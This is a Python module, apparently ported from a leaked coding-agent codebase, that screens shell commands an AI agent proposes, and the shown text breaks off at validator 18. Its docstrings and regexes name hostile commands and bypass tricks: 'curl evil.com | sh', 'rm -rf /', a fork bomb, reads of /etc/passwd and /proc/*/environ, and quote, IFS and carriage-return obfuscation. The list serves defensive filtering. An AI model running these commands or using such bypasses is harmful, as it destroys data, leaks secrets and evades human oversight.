"""cc_cortex.security.bash_validators — 24-validator bash command pipeline.

@module security.bash_validators
@responsibility Port Claude Code's ``bashSecurity.ts`` validator chain into
    pure Python. Each of the 24 validators in this module closes a SPECIFIC
    shell-injection bypass class that CC's author discovered over time. The
    pipeline runs validators in order; the first rejection short-circuits
    with a detailed :class:`ValidationResult`. All pass → ``ok=True``.

    This is a **whitelist-of-shapes** defense, not a blacklist-of-tokens
    defense. A regex-only guard is trivially bypassable (``''rm'' -rf /`` /
    ``$'\\x72m' -rf /`` / ``r\\m -rf /``) — every validator here targets a
    concrete attack primitive rather than a dangerous word list.

@dependencies stdlib only (re, shlex, string, dataclasses, typing)
@exports ValidationResult, BashValidatorConfig, Validator,
    DEFAULT_VALIDATOR_CHAIN, BashValidator, split_compound_command,
    strip_safe_wrappers, and the 24 ``validate_*`` functions.

Ported from Claude Code's TypeScript source (2026-04 leaked tree):
  - tools/BashTool/bashSecurity.ts     (all 24 validators + helpers)
  - tools/BashTool/shouldUseSandbox.ts (split_compound + wrapper strip)
  - tools/BashTool/bashPermissions.ts  (stripSafeWrappers / BINARY_HIJACK_VARS)

Tradeoff — NO shell parser:
  CC's TS code uses tree-sitter for structural analysis. We deliberately use
  regex + a tiny character-level state machine because (a) stdlib-only is a
  hard library rule and (b) tree-sitter-bash adds 20MB of native deps. The
  cost is that a handful of the 24 checks are "best-effort" — they catch the
  common bypass shapes but cannot replicate bash's full quoting semantics.
  Each best-effort validator is marked in its docstring. The default mode on
  uncertainty is **permissive** (``ok=True``): better to ask the user about a
  real risky command than to block a safe one with over-matching. The
  whitelist-of-shapes design means false positives are the expensive error —
  a single false positive breaks every user who types that shape; a false
  negative is caught by the next validator or by CC's own prompt.

Terminology — "bypass_class":
  Every rejection carries a short tag describing WHICH attack class caught it.
  Callers (e.g. audit logs, RAG retrieval over security decisions) can group
  rejections by class without parsing human-readable messages. The closed set
  is listed in ``BYPASS_CLASSES`` below.
"""

from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field
from typing import Callable, Final

__all__ = [
    "ValidationResult",
    "BashValidatorConfig",
    "Validator",
    "BYPASS_CLASSES",
    "DEFAULT_VALIDATOR_CHAIN",
    "BashValidator",
    "split_compound_command",
    "strip_safe_wrappers",
    "validate_empty",
    "validate_length",
    "validate_incomplete_commands",
    "validate_safe_command_substitution",
    "validate_git_commit",
    "validate_jq_command",
    "validate_shell_metacharacters",
    "validate_dangerous_variables",
    "validate_dangerous_patterns",
    "validate_redirections",
    "validate_newlines",
    "validate_carriage_return",
    "validate_ifs_injection",
    "validate_proc_environ_access",
    "validate_malformed_token_injection",
    "validate_obfuscated_flags",
    "validate_backslash_escaped_whitespace",
    "validate_backslash_escaped_operators",
    "validate_brace_expansion",
    "validate_unicode_whitespace",
    "validate_mid_word_hash",
    "validate_comment_quote_desync",
    "validate_quoted_newline",
    "validate_zsh_dangerous_commands",
]


# --------------------------------------------------------------------------- #
# Public data model
# --------------------------------------------------------------------------- #


BYPASS_CLASSES: Final[frozenset[str]] = frozenset(
    {
        "empty",
        "syntax",
        "command_substitution",
        "jq_risky",
        "git_commit_msg",
        "metachar",
        "dangerous_var",
        "dangerous_pattern",
        "redirection",
        "newline",
        "carriage_return",
        "ifs_injection",
        "proc_access",
        "token_injection",
        "obfuscated_flag",
        "backslash_whitespace",
        "backslash_operator",
        "brace_expansion",
        "unicode_whitespace",
        "midword_hash",
        "comment_desync",
        "quoted_newline",
        "zsh_module",
        "length",
        "none",  # sentinel for ok=True
    }
)


@dataclass(frozen=True)
class ValidationResult:
    """One validator's verdict on a (sub)command.

    ``ok=True`` means the validator did not reject the command. Callers should
    run the full chain; a single ``ok=True`` from one validator does not mean
    the command is safe overall — only that *this particular bypass class* was
    not tripped. Use :class:`BashValidator` to run the whole chain.
    """

    ok: bool
    validator: str
    reason: str
    command: str
    bypass_class: str = "none"


@dataclass
class BashValidatorConfig:
    """Knobs for the validator pipeline.

    Defaults match Claude Code's ``bashSecurity.ts`` behaviour for the
    "main" permission flow. Flip ``allow_git_commit_messages=False`` to
    remove the git-commit relaxation when operating in hardened mode
    (e.g. a CI runner where no human is available to approve prompts).
    """

    allow_git_commit_messages: bool = True
    allow_jq_expressions: bool = True
    allow_zsh: bool = False
    split_compound: bool = True
    strip_safe_wrappers: bool = True
    max_command_length: int = 16_384


Validator = Callable[[str, BashValidatorConfig], ValidationResult]


# --------------------------------------------------------------------------- #
# Helpers — quoting, escaping, substring scans
# --------------------------------------------------------------------------- #


def _ok(name: str, cmd: str, reason: str = "passthrough") -> ValidationResult:
    return ValidationResult(
        ok=True, validator=name, reason=reason, command=cmd, bypass_class="none"
    )


def _reject(
    name: str, cmd: str, reason: str, bypass_class: str
) -> ValidationResult:
    return ValidationResult(
        ok=False,
        validator=name,
        reason=reason,
        command=cmd,
        bypass_class=bypass_class,
    )


def _extract_unquoted(cmd: str) -> tuple[str, str]:
    """Return (fully_unquoted, unquoted_keep_quote_chars).

    * ``fully_unquoted`` — both ``'`` and ``"`` quoted regions removed
      entirely. Used for shape checks (``$()``, ``>``, ``$VAR``).
    * ``unquoted_keep_quote_chars`` — like ``fully_unquoted`` but the quote
      delimiters themselves are preserved. Used by ``validate_mid_word_hash``
      to detect quote-adjacent ``#`` obfuscation.

    Mirrors ``extractQuotedContent`` in ``bashSecurity.ts`` (L128-174) but
    only computes the two projections this module needs.
    """
    fully_unquoted: list[str] = []
    keep_q: list[str] = []
    in_sq = False
    in_dq = False
    escaped = False

    for ch in cmd:
        if escaped:
            escaped = False
            if not in_sq and not in_dq:
                fully_unquoted.append(ch)
                keep_q.append(ch)
            continue

        if ch == "\\" and not in_sq:
            escaped = True
            if not in_sq and not in_dq:
                fully_unquoted.append(ch)
                keep_q.append(ch)
            continue

        if ch == "'" and not in_dq:
            in_sq = not in_sq
            keep_q.append(ch)
            continue

        if ch == '"' and not in_sq:
            in_dq = not in_dq
            keep_q.append(ch)
            continue

        if not in_sq and not in_dq:
            fully_unquoted.append(ch)
            keep_q.append(ch)

    return "".join(fully_unquoted), "".join(keep_q)


def _base_command(cmd: str) -> str:
    """Return the first non-env-var token in the command (best effort).

    Skips ``FOO=bar`` assignments and bash precommand modifiers so that
    ``TZ=UTC command git commit`` resolves to ``git``. Mirrors CC's
    ``validateZshDangerousCommands`` tokenization (L2194-2210).
    """
    trimmed = cmd.strip()
    if not trimmed:
        return ""
    try:
        tokens = shlex.split(trimmed, posix=True)
    except ValueError:
        tokens = trimmed.split()
    precommand = {"command", "builtin", "noglob", "nocorrect", "exec"}
    for tok in tokens:
        if re.match(r"^[A-Za-z_]\w*=", tok):
            continue
        if tok in precommand:
            continue
        return tok
    return ""


# --------------------------------------------------------------------------- #
# Validator #1 — empty
# --------------------------------------------------------------------------- #


def validate_empty(cmd: str, cfg: BashValidatorConfig) -> ValidationResult:
    """Empty or whitespace-only commands are safe (no-op)."""
    if not cmd.strip():
        return _reject(
            "empty",
            cmd,
            "Empty or whitespace-only command",
            "empty",
        )
    return _ok("empty", cmd)


# --------------------------------------------------------------------------- #
# Validator #2 — length
# --------------------------------------------------------------------------- #


def validate_length(cmd: str, cfg: BashValidatorConfig) -> ValidationResult:
    """Reject commands exceeding ``cfg.max_command_length``.

    Resource-exhaustion guard: a 50MB shell command is almost certainly
    either a paste mistake or an attempt to DoS downstream parsers.
    """
    if len(cmd) > cfg.max_command_length:
        return _reject(
            "length",
            cmd,
            f"Command length {len(cmd)} exceeds max {cfg.max_command_length}",
            "length",
        )
    return _ok("length", cmd)


# --------------------------------------------------------------------------- #
# Validator #3 — incomplete commands (unclosed quotes/parens/brackets)
# --------------------------------------------------------------------------- #

_INCOMPLETE_LEADING_OPERATOR = re.compile(r"^\s*(?:&&|\|\||;|>>?|<)")


def validate_incomplete_commands(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Detect syntactically incomplete commands.

    Catches:
      - Tab-led fragments (continuation lines).
      - Commands starting with flags (``-f foo`` with no binary).
      - Commands starting with shell operators (``&& rm``).
      - Unclosed ``"`` / ``'`` / ``$(`` / ``(``.

    Incomplete commands are a well-known obfuscation primitive because
    downstream parsers may silently normalize them into valid (dangerous)
    commands. Mirrors ``validateIncompleteCommands`` L244-286 plus
    parenthesis/quote balance checks that TS handles via tree-sitter.
    """
    if not cmd.strip():
        return _ok("incomplete_commands", cmd)

    if re.match(r"^\s*\t", cmd):
        return _reject(
            "incomplete_commands",
            cmd,
            "Command starts with a tab (appears to be a continuation line)",
            "syntax",
        )

    trimmed = cmd.strip()
    if trimmed.startswith("-"):
        return _reject(
            "incomplete_commands",
            cmd,
            "Command starts with a flag (fragment, no binary)",
            "syntax",
        )

    if _INCOMPLETE_LEADING_OPERATOR.match(cmd):
        return _reject(
            "incomplete_commands",
            cmd,
            "Command starts with a shell operator (continuation line)",
            "syntax",
        )

    # Quote & paren balance — walk the string respecting single/double quotes
    # and ``$(...)`` nesting. We track three separate counters:
    #   - paren_depth: tracks ``$(`` and ``(`` (bash treats ``(`` as a
    #                  subshell, so any unclosed ``(`` is incomplete).
    #   - sq_open / dq_open: boolean state machines for quotes.
    #
    # The shell_quote side of CC's TS walks these too (via tryParseShellCommand).
    # Python port uses a direct char-scanner because shlex.split does not
    # distinguish between quoted content types and won't tell us WHICH quote
    # was unclosed.
    paren_depth = 0
    sq = False
    dq = False
    esc = False
    i = 0
    while i < len(cmd):
        ch = cmd[i]
        if esc:
            esc = False
            i += 1
            continue
        if ch == "\\" and not sq:
            esc = True
            i += 1
            continue
        if ch == "'" and not dq:
            sq = not sq
            i += 1
            continue
        if ch == '"' and not sq:
            dq = not dq
            i += 1
            continue
        if not sq and not dq:
            if ch == "(" or (
                ch == "$" and i + 1 < len(cmd) and cmd[i + 1] == "("
            ):
                paren_depth += 1
                i += 2 if ch == "$" else 1
                continue
            if ch == ")":
                paren_depth -= 1
                i += 1
                continue
        i += 1

    if sq:
        return _reject(
            "incomplete_commands",
            cmd,
            "Command has an unclosed single quote",
            "syntax",
        )
    if dq:
        return _reject(
            "incomplete_commands",
            cmd,
            "Command has an unclosed double quote",
            "syntax",
        )
    if paren_depth != 0:
        return _reject(
            "incomplete_commands",
            cmd,
            f"Command has unbalanced parentheses (depth={paren_depth})",
            "syntax",
        )

    return _ok("incomplete_commands", cmd)


# --------------------------------------------------------------------------- #
# Validator #4 — safe command substitution (heredoc-in-substitution)
# --------------------------------------------------------------------------- #

_HEREDOC_IN_SUBST = re.compile(r"\$\(.*<<")


def validate_safe_command_substitution(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject ``$(cat <<EOF ...)`` patterns outright.

    CC's TS code has a sophisticated early-allow path for the specific shape
    ``prefix $(cat <<'EOF'\\n...\\nEOF\\n)`` where the delimiter is quoted
    (no expansion). That requires line-based matching + remainder
    re-validation to be safe — a job too big for a regex port.

    We take the stricter approach: reject ANY ``$(...<<...`` pattern as an
    obfuscation primitive. Legitimate uses can be rewritten with ``echo``
    pipes. Best-effort validator — rejects the known-bad shape.
    """
    if _HEREDOC_IN_SUBST.search(cmd):
        return _reject(
            "safe_command_substitution",
            cmd,
            "Heredoc inside $(...) command substitution",
            "command_substitution",
        )
    return _ok("safe_command_substitution", cmd)


# --------------------------------------------------------------------------- #
# Validator #5 — git commit -m
# --------------------------------------------------------------------------- #

_GIT_COMMIT_RE = re.compile(
    r"""^git[ \t]+commit[ \t]+
        [^;&|`$<>()\n\r]*?
        -m[ \t]+
        (["'])(.*?)\1
        (.*)$
    """,
    re.VERBOSE | re.DOTALL,
)
_GIT_COMMIT_PREFIX = re.compile(r"^git[ \t]+commit\b")
_GIT_MSG_SUBST = re.compile(r"\$\(|`|\$\{")
_GIT_REMAINDER_META = re.compile(r"[;|&()`]|\$\(|\$\{")


def validate_git_commit(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Allow simple ``git commit -m "..."``; reject substitution in message.

    Mirrors ``validateGitCommit`` L612-740. Key attack: ``git commit -m
    "msg $(rm -rf /)"`` expands inside the double-quoted message. Single
    quotes are safer (no bash expansion) and are accepted verbatim.

    If ``cfg.allow_git_commit_messages=False``, ALL git commit forms are
    rejected — use this for hardened environments where the agent should
    never commit on its own.
    """
    base = _base_command(cmd)
    if base != "git" or not _GIT_COMMIT_PREFIX.match(cmd.strip()):
        return _ok("git_commit", cmd, "Not a git commit")

    if not cfg.allow_git_commit_messages:
        return _reject(
            "git_commit",
            cmd,
            "git commit disallowed by config (allow_git_commit_messages=False)",
            "git_commit_msg",
        )

    if "\\" in cmd:
        # TS falls through to main chain on backslash; we do the same.
        return _ok("git_commit", cmd, "git commit with backslash defers to chain")

    m = _GIT_COMMIT_RE.match(cmd.strip())
    if not m:
        return _ok("git_commit", cmd, "git commit without recognized -m form")

    quote, message, remainder = m.group(1), m.group(2), m.group(3)

    if quote == '"' and _GIT_MSG_SUBST.search(message):
        return _reject(
            "git_commit",
            cmd,
            "Git commit message contains command substitution ($(...) / `` / ${})",
            "git_commit_msg",
        )

    if remainder and _GIT_REMAINDER_META.search(remainder):
        return _reject(
            "git_commit",
            cmd,
            "git commit remainder contains shell metacharacters",
            "git_commit_msg",
        )

    if message.startswith("-"):
        return _reject(
            "git_commit",
            cmd,
            "git commit message starts with a dash (potential flag obfuscation)",
            "git_commit_msg",
        )

    return _ok("git_commit", cmd, "git commit with simple quoted message")


# --------------------------------------------------------------------------- #
# Validator #6 — jq
# --------------------------------------------------------------------------- #

_JQ_DANGEROUS_FLAGS = re.compile(
    r"(?:^|\s)(?:-f\b|--from-file|--rawfile|--slurpfile|-L\b|--library-path)"
)
_JQ_SYSTEM_FN = re.compile(r"\bsystem\s*\(")


def validate_jq_command(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Block jq flags that read files or invoke system().

    Mirrors ``validateJqCommand`` L742-781. jq is whitelisted in most
    permission setups because it is usually pure data transformation, BUT:

      * ``jq -f /etc/passwd '.something'`` reads arbitrary files as filter
        definitions — an arbitrary-file-read primitive.
      * ``jq 'system("rm -rf /")'`` — jq has a built-in ``system()``
        function that shells out.
    """
    if _base_command(cmd) != "jq":
        return _ok("jq", cmd, "Not jq")

    if _JQ_SYSTEM_FN.search(cmd):
        return _reject(
            "jq",
            cmd,
            "jq command uses system() function (arbitrary command execution)",
            "jq_risky",
        )

    # afterJq mirrors TS: check the slice AFTER the `jq` literal
    after = cmd.strip()[2:].lstrip()
    if _JQ_DANGEROUS_FLAGS.search(" " + after):
        return _reject(
            "jq",
            cmd,
            "jq command uses file-reading flag (-f / --rawfile / --slurpfile / -L)",
            "jq_risky",
        )

    return _ok("jq", cmd)


# --------------------------------------------------------------------------- #
# Validator #7 — shell metacharacters in quoted argument values
# --------------------------------------------------------------------------- #

_META_IN_QUOTED = re.compile(r"""(?:^|\s)["'][^"']*[;&][^"']*["'](?:\s|$)""")
_META_IN_FIND_NAME = [
    re.compile(r"""-name\s+["'][^"']*[;|&][^"']*["']"""),
    re.compile(r"""-path\s+["'][^"']*[;|&][^"']*["']"""),
    re.compile(r"""-iname\s+["'][^"']*[;|&][^"']*["']"""),
    re.compile(r"""-regex\s+["'][^"']*[;&][^"']*["']"""),
]


def validate_shell_metacharacters(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Catch ``;|&`` hidden inside QUOTED argument values.

    Mirrors ``validateShellMetacharacters`` L783-821. This specifically
    targets ``find -name 'foo;evil'`` style payloads where the outer parser
    sees a single quoted argument but a downstream ``eval`` / ``sh -c`` re-
    parses the contents. Only fires on quoted regions; the compound
    splitter handles unquoted ``;|&`` separately.
    """
    if _META_IN_QUOTED.search(cmd):
        return _reject(
            "shell_metacharacters",
            cmd,
            "Shell metacharacter (; or &) inside quoted argument",
            "metachar",
        )
    for pat in _META_IN_FIND_NAME:
        if pat.search(cmd):
            return _reject(
                "shell_metacharacters",
                cmd,
                "Shell metacharacter inside find -name/-path/-regex argument",
                "metachar",
            )
    return _ok("shell_metacharacters", cmd)


# --------------------------------------------------------------------------- #
# Validator #8 — dangerous variables in redirections/pipes
# --------------------------------------------------------------------------- #

_VAR_IN_REDIR = re.compile(r"[<>|]\s*\$[A-Za-z_]")
_VAR_BEFORE_PIPE = re.compile(r"\$[A-Za-z_][A-Za-z0-9_]*\s*[|<>]")


def validate_dangerous_variables(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject ``$VAR`` immediately adjacent to a redirection or pipe.

    Pattern: ``> $OUT`` / ``$CMD | sh``. Variables in these positions are
    high-value injection primitives — if the attacker controls ``OUT``, they
    control the destination file; if they control ``CMD``, they control the
    pipeline source. Mirrors ``validateDangerousVariables`` L823-844.
    """
    fu, _ = _extract_unquoted(cmd)
    if _VAR_IN_REDIR.search(fu) or _VAR_BEFORE_PIPE.search(fu):
        return _reject(
            "dangerous_variables",
            cmd,
            "Variable expansion adjacent to redirection or pipe",
            "dangerous_var",
        )
    return _ok("dangerous_variables", cmd)


# --------------------------------------------------------------------------- #
# Validator #9 — dangerous patterns (rm -rf /, fork bombs, curl|sh)
# --------------------------------------------------------------------------- #

_FORK_BOMB = re.compile(r":\s*\(\s*\)\s*\{")
_RM_RF_ROOT = re.compile(
    r"\brm\s+"
    r"(?:-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)[a-zA-Z]*"
    r"\s+(?:/|/\*|\*|\~|--no-preserve-root)"
)
_CURL_PIPE_SH = re.compile(
    r"(?:curl|wget)\b[^\n]*\|\s*(?:sh|bash|zsh|ksh|dash)\b"
)
_SUBSTITUTION_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"<\("), "process substitution <()"),
    (re.compile(r">\("), "process substitution >()"),
    (re.compile(r"=\("), "zsh process substitution =()"),
    (re.compile(r"(?:^|[\s;&|])=[a-zA-Z_]"), "zsh equals expansion (=cmd)"),
    (re.compile(r"\$\("), "$() command substitution"),
    (re.compile(r"\$\{"), "${} parameter substitution"),
    (re.compile(r"\$\["), "$[] legacy arithmetic expansion"),
    (re.compile(r"~\["), "zsh parameter expansion"),
    (re.compile(r"\}\s*always\s*\{"), "zsh always construct"),
    (re.compile(r"<#"), "powershell comment syntax"),
]


def _has_unescaped(content: str, ch: str) -> bool:
    escaped = False
    for c in content:
        if escaped:
            escaped = False
            continue
        if c == "\\":
            escaped = True
            continue
        if c == ch:
            return True
    return False


def validate_dangerous_patterns(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject known-destructive shapes and all command substitution forms.

    Three families:
      1. Destructive commands: ``rm -rf /``, ``:(){ :|:& };:`` fork bomb,
         ``curl evil.com | sh``.
      2. Unescaped backticks (``cmd \\`evil\\```).
      3. Every substitution shape from CC's ``COMMAND_SUBSTITUTION_PATTERNS``
         (``$()`` / ``${}`` / ``$[]`` / ``<()`` / zsh ``=cmd`` / zsh
         ``always {}``).

    Mirrors ``validateDangerousPatterns`` L846-873 + the destructive shape
    list from TS ``bashPermissions.ts``.
    """
    fu, _ = _extract_unquoted(cmd)

    if _FORK_BOMB.search(fu):
        return _reject(
            "dangerous_patterns",
            cmd,
            "Fork bomb pattern detected",
            "dangerous_pattern",
        )
    if _RM_RF_ROOT.search(fu):
        return _reject(
            "dangerous_patterns",
            cmd,
            "Destructive rm -rf against root or wildcard",
            "dangerous_pattern",
        )
    if _CURL_PIPE_SH.search(fu):
        return _reject(
            "dangerous_patterns",
            cmd,
            "Piping a downloader (curl/wget) into a shell",
            "dangerous_pattern",
        )

    if _has_unescaped(fu, "`"):
        return _reject(
            "dangerous_patterns",
            cmd,
            "Unescaped backtick command substitution",
            "dangerous_pattern",
        )

    for pat, label in _SUBSTITUTION_PATTERNS:
        if pat.search(fu):
            return _reject(
                "dangerous_patterns",
                cmd,
                f"Command contains {label}",
                "dangerous_pattern",
            )

    return _ok("dangerous_patterns", cmd)


# --------------------------------------------------------------------------- #
# Validator #10 — redirections
# --------------------------------------------------------------------------- #

_REDIR_SAFE_STRIP = [
    re.compile(r"\s+2\s*>&\s*1(?=\s|$)"),
    re.compile(r"[012]?\s*>\s*/dev/null(?=\s|$)"),
    re.compile(r"\s*<\s*/dev/null(?=\s|$)"),
]
_SENSITIVE_REDIR_TARGETS = re.compile(
    r">\s*/(?:etc|dev/sd|dev/nvme|dev/xvd|boot|root|proc|sys)"
)


def _strip_safe_redirections(s: str) -> str:
    out = s
    for pat in _REDIR_SAFE_STRIP:
        out = pat.sub("", out)
    return out


def validate_redirections(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject unsafe redirections.

    Concretely:
      * Output redirect to /etc, /dev/sd*, /proc, /sys, /boot, /root.
      * Any unquoted ``<`` (input redirect) that isn't ``< /dev/null``.
      * Any unquoted ``>`` that isn't ``> /dev/null`` / ``2>&1``.

    Mirrors ``validateRedirections`` L875-903. CC's TS version rejects ALL
    ``<`` and ``>`` outside the safe-strip list; we do the same. This is
    intentionally strict — legitimate redirects need user approval.
    """
    fu, _ = _extract_unquoted(cmd)
    fu = _strip_safe_redirections(fu)

    if _SENSITIVE_REDIR_TARGETS.search(fu):
        return _reject(
            "redirections",
            cmd,
            "Output redirection to sensitive path",
            "redirection",
        )

    if "<" in fu:
        return _reject(
            "redirections",
            cmd,
            "Input redirection (<) could read arbitrary files",
            "redirection",
        )
    if ">" in fu:
        return _reject(
            "redirections",
            cmd,
            "Output redirection (>) could write arbitrary files",
            "redirection",
        )
    return _ok("redirections", cmd)


# --------------------------------------------------------------------------- #
# Validator #11 — literal newlines
# --------------------------------------------------------------------------- #

_NEWLINE_THEN_CMD = re.compile(r"[\n\r]\s*\S")


def validate_newlines(cmd: str, cfg: BashValidatorConfig) -> ValidationResult:
    """Reject literal newlines that separate commands.

    Mirrors ``validateNewlines`` L905-941. A literal ``\\n`` followed by any
    non-whitespace character is treated as a second command in bash. CC
    allows backslash-newline line continuations (``cmd \\<nl>--flag``);
    we replicate that by checking if the newline is preceded by an escape.
    """
    fu, _ = _extract_unquoted(cmd)
    if "\n" not in fu and "\r" not in fu:
        return _ok("newlines", cmd)

    # Collapse backslash-newline continuations, then re-check.
    collapsed = re.sub(r"\s\\[\n\r]", " ", fu)
    if _NEWLINE_THEN_CMD.search(collapsed):
        return _reject(
            "newlines",
            cmd,
            "Literal newline followed by another command",
            "newline",
        )
    return _ok("newlines", cmd)


# --------------------------------------------------------------------------- #
# Validator #12 — carriage return
# --------------------------------------------------------------------------- #


def validate_carriage_return(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject CR (``\\r``) outside double quotes.

    Mirrors ``validateCarriageReturn`` L971-1015. CR is a parser
    differential: shell-quote's tokenizer treats CR as a token boundary
    but bash treats it as literal content inside words. Attack:
    ``TZ=UTC\\recho curl evil.com`` bypasses a naive ``echo`` allowlist.
    """
    if "\r" not in cmd:
        return _ok("carriage_return", cmd)

    in_sq = False
    in_dq = False
    esc = False
    for ch in cmd:
        if esc:
            esc = False
            continue
        if ch == "\\" and not in_sq:
            esc = True
            continue
        if ch == "'" and not in_dq:
            in_sq = not in_sq
            continue
        if ch == '"' and not in_sq:
            in_dq = not in_dq
            continue
        if ch == "\r" and not in_dq:
            return _reject(
                "carriage_return",
                cmd,
                "Carriage return outside double quotes",
                "carriage_return",
            )
    return _ok("carriage_return", cmd)


# --------------------------------------------------------------------------- #
# Validator #13 — IFS injection
# --------------------------------------------------------------------------- #

_IFS_PAT = re.compile(r"\$IFS|\$\{[^}]*IFS")


def validate_ifs_injection(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject any ``$IFS`` / ``${...IFS...}`` usage.

    Mirrors ``validateIFSInjection`` L1017-1036. Attackers use ``$IFS`` to
    smuggle separator characters past regex filters (``cat$IFS/etc/passwd``
    contains no space). Block the entire IFS variable.
    """
    if _IFS_PAT.search(cmd):
        return _reject(
            "ifs_injection",
            cmd,
            "Command uses $IFS variable (regex filter bypass primitive)",
            "ifs_injection",
        )
    return _ok("ifs_injection", cmd)


# --------------------------------------------------------------------------- #
# Validator #14 — /proc/*/environ access
# --------------------------------------------------------------------------- #

_PROC_ENVIRON = re.compile(r"/proc/[^/]*/environ\b")


def validate_proc_environ_access(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject reads of ``/proc/*/environ``.

    Mirrors ``validateProcEnvironAccess`` L1041-1067. The environ files
    leak env vars of any readable process — secrets, API keys, CI tokens.
    Path validation usually blocks ``/proc``, but this is defense-in-depth
    for hooks that bypass the path check.
    """
    if _PROC_ENVIRON.search(cmd):
        return _reject(
            "proc_environ_access",
            cmd,
            "Command reads /proc/*/environ (env var leak)",
            "proc_access",
        )
    return _ok("proc_environ_access", cmd)


# --------------------------------------------------------------------------- #
# Validator #15 — malformed tokens / null bytes
# --------------------------------------------------------------------------- #


def validate_malformed_token_injection(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject null bytes and obviously-malformed token separators.

    Full CC version L1082-1128 uses shell-quote's token parser to detect
    unbalanced tokens combined with command separators. Best-effort port:
    we flag null bytes (``\\x00``), stray control characters in argument
    positions, and clearly-unbalanced brace pairs with separators.
    """
    if "\x00" in cmd:
        return _reject(
            "malformed_token_injection",
            cmd,
            "Null byte injection",
            "token_injection",
        )
    # Bell/vertical tab/form feed are parser differentials between sh parsers
    for bad in ("\x07", "\x0b", "\x0c"):
        if bad in cmd:
            return _reject(
                "malformed_token_injection",
                cmd,
                f"Control character U+{ord(bad):04X} in command",
                "token_injection",
            )
    return _ok("malformed_token_injection", cmd)


# --------------------------------------------------------------------------- #
# Validator #16 — obfuscated flags
# --------------------------------------------------------------------------- #

_ANSI_C_QUOTE = re.compile(r"\$'[^']*'")
_LOCALE_QUOTE = re.compile(r"\$\"[^\"]*\"")
_EMPTY_QUOTE_DASH = re.compile(r"""(?:^|\s)(?:''|"")+\s*-""")
_HOMO_EMPTY_BEFORE_QUOTED_DASH = re.compile(r"""(?:""|'')+['"]-""")
_TRIPLE_QUOTE_WORD_START = re.compile(r"""(?:^|\s)['"]{3,}""")
_SPACE_QUOTE_DASH_FU = re.compile(r"""\s['"`]-""")


def validate_obfuscated_flags(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Block quote-obfuscated flag names.

    Mirrors ``validateObfuscatedFlags`` L1130-1537. Attack families:

      * ANSI-C quoting: ``$'\\x2dexec'`` encodes ``-exec`` through escape
        sequences, bypassing ``--no-exec``-style allowlists.
      * Locale quoting: ``$"..."`` — same primitive, different delimiter.
      * Empty-quote prefixes: ``''-exec`` / ``""-f`` — bash concatenates
        empty strings into the adjacent flag.
      * Triple-quote word start: ``'''flag`` is always obfuscation.
      * Whitespace followed by a quoted dash: ``" -exec"`` inside a word
        boundary.

    Echo is exempted from the word-level quoted-flag scan in TS; we
    replicate that exemption only for the simplest ``echo "...-..."`` case.
    """
    # Simple-echo exemption: only allow for SIMPLE echo commands (no
    # metacharacters), matching TS L1139-1144.
    base = _base_command(cmd)
    has_ops = bool(re.search(r"[|&;]", cmd))

    if _ANSI_C_QUOTE.search(cmd):
        return _reject(
            "obfuscated_flags",
            cmd,
            "ANSI-C quoting ($'...') hides characters behind escape sequences",
            "obfuscated_flag",
        )
    if _LOCALE_QUOTE.search(cmd):
        return _reject(
            "obfuscated_flags",
            cmd,
            "Locale quoting ($\"...\") hides characters behind escape sequences",
            "obfuscated_flag",
        )
    if _EMPTY_QUOTE_DASH.search(cmd):
        return _reject(
            "obfuscated_flags",
            cmd,
            "Empty quote pair before dash (flag concatenation bypass)",
            "obfuscated_flag",
        )
    if _HOMO_EMPTY_BEFORE_QUOTED_DASH.search(cmd):
        return _reject(
            "obfuscated_flags",
            cmd,
            "Empty homogeneous quote pair adjacent to quoted dash",
            "obfuscated_flag",
        )
    if _TRIPLE_QUOTE_WORD_START.search(cmd):
        return _reject(
            "obfuscated_flags",
            cmd,
            "Three or more consecutive quote chars at word start",
            "obfuscated_flag",
        )

    if base == "echo" and not has_ops:
        return _ok("obfuscated_flags", cmd, "simple echo exempted")

    fu, _keep = _extract_unquoted(cmd)
    if _SPACE_QUOTE_DASH_FU.search(" " + fu):
        return _reject(
            "obfuscated_flags",
            cmd,
            "Quoted dash at word start",
            "obfuscated_flag",
        )

    return _ok("obfuscated_flags", cmd)


# --------------------------------------------------------------------------- #
# Validator #17 — backslash-escaped whitespace
# --------------------------------------------------------------------------- #


def _has_backslash_escaped(cmd: str, targets: set[str]) -> bool:
    in_sq = False
    in_dq = False
    i = 0
    while i < len(cmd):
        ch = cmd[i]
        if ch == "\\" and not in_sq:
            if not in_dq and i + 1 < len(cmd) and cmd[i + 1] in targets:
                return True
            i += 2
            continue
        if ch == '"' and not in_sq:
            in_dq = not in_dq
        elif ch == "'" and not in_dq:
            in_sq = not in_sq
        i += 1
    return False


def validate_backslash_escaped_whitespace(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
    """Reject ``\\ `` or ``\\<tab>`` outside of quotes.

    Mirrors ``hasBackslashEscapedWhitespace`` L1549-1581. Attack: ``echo\\
    test/../../bin/sh`` parses as one token (directory ``echo test``) in
    bash but shell-quote splits it into two, letting the validator think
    the command is ``echo`` while bash actually runs the ``sh`` inside.
    """
    if _has_backslash_escaped(cmd, {" ", "\t"}):
        return _reject(
            "backslash_escaped_whitespace",
            cmd,
            "Backslash-escaped whitespace outside quotes (tokenization differential)",
            "backslash_whitespace",
        )
    return _ok("backslash_escaped_whitespace", cmd)


# --------------------------------------------------------------------------- #
# Validator #18 — backslash-escaped operators
# --------------------------------------------------------------------------- #


def validate_backslash_escaped_operators(
    cmd: str, cfg: BashValidatorConfig
) -> ValidationResult:
